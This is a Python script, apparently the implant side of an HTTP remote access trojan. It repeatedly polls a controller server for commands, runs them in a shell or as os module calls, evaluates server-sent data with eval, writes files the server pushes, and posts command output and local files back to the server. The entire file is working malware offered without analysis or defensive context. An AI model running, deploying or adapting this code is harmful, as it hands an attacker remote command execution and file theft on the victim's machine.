#!/usr/bin/python3 
import requests
import subprocess
from os import path 


def os(server,c):
    AT = c.split()
    attribute = AT[0]
    module = __import__("os")
    try:
        function = getattr(module, attribute)
        if len(AT) == 2:
            argument = AT[1]
            try:
                A = function(argument)
                R = requests.post(server, A)
            except Exception as E:
                R = requests.post(server, (str(E).encode("utf-8")))
        else:
            try:
                A = function()
                R = requests.post(server, A)
            except Exception as E:
                R = requests.post(server, (str(E).encode("utf-8")))

    except Exception as E:
        R = requests.post(server, (str(E).encode("utf-8")))

def process(server,command):
    P = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    OUT = P.stdout.read()
    ERR = P.stderr.read()
    if not OUT:
        R = requests.post(server, ERR)
    else:
        R = requests.post(server, OUT)

def fileRequest(server,fileName):
    server+="/download"
    R = requests.post(server,fileName.encode('utf-8'))

def fileDownload(server,d):
    dataDict=eval(d)
    fileName=dataDict['name']
    fileData=dataDict['file']
    try:
        with open(fileName, 'wb') as o:
            o.write( fileData.file.read() )
    except Exception as e:
        R = requests.post(server,(str(e)).encode('utf-8'))


def fileSender(server,fileName):
    if path.exists(fileName):
        server+="/upload"
        file={'file': open(fileName,"rb"),'name':fileName }
        requests.post(server,files=file)     
    else:
        R = requests.post(server,("File missing").encode('utf-8'))

IP=""
SERVER = f'http://{IP}'
while True:
    try:
        RevcivedData = requests.get(SERVER)
        command = RevcivedData.text
        if command.startswith("*"):
            os(SERVER,command[1:])
        elif command.startswith("download "):
            fileSender(SERVER,command.split("download ")[1])
        elif command.startswith("upload "):
            fileRequest(SERVER,command.split("upload ")[1]) 
        elif command.startswith("save "):
            fileDownload(SERVER,command.split("save ")[1]) 
        else:
            process(SERVER,command)
    except Exception as e:
            pass
    